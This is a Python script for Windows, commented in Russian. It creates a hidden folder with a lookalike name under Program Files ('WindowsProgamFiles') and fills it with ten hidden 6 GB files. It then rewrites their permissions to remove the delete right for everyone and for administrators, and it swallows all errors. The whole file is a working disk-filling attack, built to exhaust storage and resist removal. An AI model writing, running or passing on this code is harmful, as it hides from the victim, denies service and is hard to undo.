import os
import ctypes
from ctypes import wintypes
import win32security
import ntsecuritycon as con
import pywintypes

# Целевой путь и параметры
FOLDER_PATH = r"C:\Program Files\WindowsProgamFiles"
FILE_COUNT = 10
FILE_SIZE = 6 * 1024 * 1024 * 1024  # 6 ГБ в байтах
CHUNK_SIZE = 512 * 1024 * 1024  # 512 МБ для каждой порции

# Инициализация SID один раз
EVERYONE_SID = win32security.CreateWellKnownSid(win32security.WinWorldSid)
ADMINS_SID = win32security.CreateWellKnownSid(win32security.WinBuiltinAdministratorsSid)

def set_hidden(path):
    """Устанавливает атрибут 'скрытый'."""
    FILE_ATTRIBUTE_HIDDEN = 0x2
    ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)

def deny_delete_access(path):
    """Запрещает удаление, убирая разрешение DELETE."""
    try:
        security_descriptor = win32security.GetFileSecurity(
            path, win32security.DACL_SECURITY_INFORMATION
        )
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAce(
            win32security.ACL_REVISION,
            con.FILE_GENERIC_READ | con.FILE_GENERIC_WRITE,
            EVERYONE_SID
        )
        dacl.AddAccessAllowedAce(
            win32security.ACL_REVISION,
            con.FILE_GENERIC_READ | con.FILE_GENERIC_WRITE,
            ADMINS_SID
        )
        security_descriptor.SetDacl(True, dacl, False)
        win32security.SetFileSecurity(
            path, win32security.DACL_SECURITY_INFORMATION, security_descriptor
        )
    except pywintypes.error:
        pass

def create_large_file(filepath, size):
    """Создаёт файл заданного размера максимально быстро."""
    with open(filepath, 'wb') as f:
        chunk = b'\0' * CHUNK_SIZE
        bytes_written = 0
        while bytes_written < size:
            remaining = min(CHUNK_SIZE, size - bytes_written)
            f.write(chunk[:remaining])
            bytes_written += remaining
    set_hidden(filepath)
    deny_delete_access(filepath)

def main():
    try:
        os.makedirs(FOLDER_PATH, exist_ok=True)
        set_hidden(FOLDER_PATH)
        deny_delete_access(FOLDER_PATH)

        for i in range(1, FILE_COUNT + 1):
            filename = f"PhantomByte{i}.bin"
            filepath = os.path.join(FOLDER_PATH, filename)
            create_large_file(filepath, FILE_SIZE)
    except (PermissionError, OSError, pywintypes.error):
        pass

if __name__ == "__main__":
    main()
